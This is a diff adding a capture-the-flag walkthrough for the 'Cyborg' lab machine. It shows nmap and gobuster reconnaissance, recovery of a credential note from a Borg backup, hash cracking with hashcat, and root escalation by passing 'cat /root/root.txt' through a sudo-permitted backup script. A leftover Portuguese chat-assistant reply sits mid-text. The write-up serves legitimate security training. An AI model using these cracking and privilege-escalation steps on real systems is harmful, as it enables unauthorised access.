@@ -1,0 +1,86 @@
+**Inglês:**
+
+1. Run an initial Nmap scan to discover open ports and services:
+   ```
+   nmap -sCV --open -oN nmap cyborg.thm
+   ```
+
+   Output:
+   ```
+   PORT   STATE SERVICE VERSION
+   22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+   80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+   |_http-server-header: Apache/2.4.18 (Ubuntu)
+   |_http-title: Apache2 Ubuntu Default Page: It works
+   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+   ```
+
+2. Use GoBuster to search for directories on the web server:
+   ```
+   gobuster dir -u http://cyborg.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 90
+   ```
+
+   Explanation:
+   - `dir`: Specifies directory mode.
+   - `-u`: Specifies the URL.
+   - `-w`: Specifies the path to the wordlist.
+   - `-t`: Sets the number of threads for concurrent requests. Threads are often used to manage client requests and execute code to process these requests.
+
+   Output:
+   ```
+   [--> http://cyborg.thm/admin/]
+   [--> http://cyborg.thm/etc/]
+   ```
+
+3. Explore the `/admin/` directory and find a "arquive.tar" to extract.
+   - It's a Borg Backup repository. See [https://borgbackup.readthedocs.io/](https://borgbackup.readthedocs.io/).
+
+4. Examine the contents of `music_archive` and find a note with a username and password.
+   ```
+   cat home/alex/Documents/note.txt
+   ```
+
+   Output:
+   ```
+   Wow, I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
+   " user:passwd "
+   ```
+
+5. Investigate the `/etc/` directory and find a file named `passwd`.
+   - Look for encrypted passwords in the file.
+
+6. Analyze the hash in `passwd` using hashid to identify the hash type.
+   ```
+   hashid "hash"
+   ```
+
+7. If the hash is identified as type 1600, use hashcat to attempt to crack it:
+   ```
+   hashcat -a 0 -m 1600 "hash" "path/to/word/list"
+   ```
+
+8. Inside the machine, check sudo permissions for the user:
+   ```
+   sudo -l
+   ```
+
+   Output:
+   ```
+   (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
+   ```
+
+9. Identify that the user has permission to execute a `.sh` file with root privileges without a password.
+   - Analyze the `backup.sh` script which requires an argument to complete the program execution.
+
+10. Exploit the `backup.sh` script to gain root access.
+
+  Claro, vou adicionar a observação que você mencionou ao final das etapas:
+
+**Inglês:**
+
+11. To escalate to root, let's analyze the code. It appears to be waiting for an argument where there's a "WHILE" loop. Therefore, you can use the following command to execute a command and obtain the root flag:
+   ```
+   sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
+   ```
+
+12. This command will retrieve the root flag.
